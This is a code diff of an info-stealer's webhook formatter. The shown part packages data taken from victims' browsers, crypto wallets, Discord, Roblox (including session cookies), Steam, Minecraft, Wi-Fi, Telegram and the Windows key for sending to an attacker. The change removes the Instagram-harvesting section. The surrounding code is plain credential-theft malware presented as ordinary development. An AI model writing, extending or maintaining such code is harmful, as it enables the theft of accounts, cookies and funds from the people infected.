@@ -125,7 +125,7 @@ class WebhookFormatter:
         return embed
 
     def send_all(self, system_info, geo_info, browser_stealer, discord_info, roblox_data,
-                 instagram_data, steam_data, mc_data, wallet_stealer, wifi_data, kiwi_stealer,
+                 steam_data, mc_data, wallet_stealer, wifi_data, kiwi_stealer,
                  windows_key, software_list, telegram_data):
         ip = geo_info[0]
         pc_name = system_info.get('hostname', 'Unknown')
@@ -226,9 +226,6 @@ class WebhookFormatter:
 
         if roblox_data:
             extra_parts.append('ROBLOX\n' + '=' * 40 + '\nUsername: ' + str(roblox_data.get('username', 'N/A')) + '\nID: ' + str(roblox_data.get('id', 'N/A')) + '\nRobux: ' + str(roblox_data.get('robux', 0)) + '\nPremium: ' + str(roblox_data.get('premium', False)) + '\nCookie: ' + str(roblox_data.get('cookie', 'N/A'))[:200])
-
-        if instagram_data:
-            extra_parts.append('INSTAGRAM\n' + '=' * 40 + '\nUsername: ' + str(instagram_data.get('username', 'N/A')) + '\nFull Name: ' + str(instagram_data.get('full_name', 'N/A')) + '\nEmail: ' + str(instagram_data.get('email', 'N/A')) + '\nPhone: ' + str(instagram_data.get('phone', 'N/A')) + '\nFollowers: ' + str(instagram_data.get('followers', 'N/A')) + '\nFollowing: ' + str(instagram_data.get('following', 'N/A')))
 
         if steam_data and steam_data.get('found'):
             accts = steam_data.get('account_names', [])
